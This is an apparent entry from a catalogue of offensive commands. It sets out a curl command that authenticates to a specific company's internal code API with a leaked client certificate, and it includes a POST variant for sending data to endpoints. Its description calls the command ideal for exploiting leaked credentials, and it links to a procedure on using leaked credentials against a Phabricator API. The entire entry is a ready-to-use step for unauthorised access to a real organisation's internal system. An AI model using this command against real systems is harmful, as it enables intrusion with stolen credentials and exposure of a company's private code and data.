---
data: >-
  curl -u username: --cert leaked_certificate.pem
  https://code.uberinternal.com/api/
tags:
  - curl
  - authentication
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 2c3347f0-ef3e-49e2-88e1-af1e8dad1d77
created_at: '2025-12-11T03:48:06.077Z'
updated_at: '2025-12-11T03:48:06.077Z'
verified: false
validated: true
submitted: true
---
# curl-authenticate-api

## Command

```bash
curl -u username: --cert leaked_certificate.pem https://code.uberinternal.com/api/
```

## Description

Authenticates to an API endpoint using a username and client certificate, ideal for exploiting leaked credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u username:` | Basic auth username (password blank if not needed) | Yes |
| `--cert leaked_certificate.pem` | Path to client certificate | Yes |
| `https://code.uberinternal.com/api/` | Target API URL | Yes |

## Examples

### Basic Usage

```bash
curl -u username: --cert leaked_certificate.pem https://code.uberinternal.com/api/
```

### Advanced Usage

```bash
curl -u username: --cert leaked_certificate.pem -X POST https://code.uberinternal.com/api/endpoint -d 'data'
```

## Expected Output

API response body if authentication succeeds, e.g., JSON data from Phabricator.

## Related

- [[procedures/Authenticate-to-Phabricator-API-Using-Leaked-Credentials]]
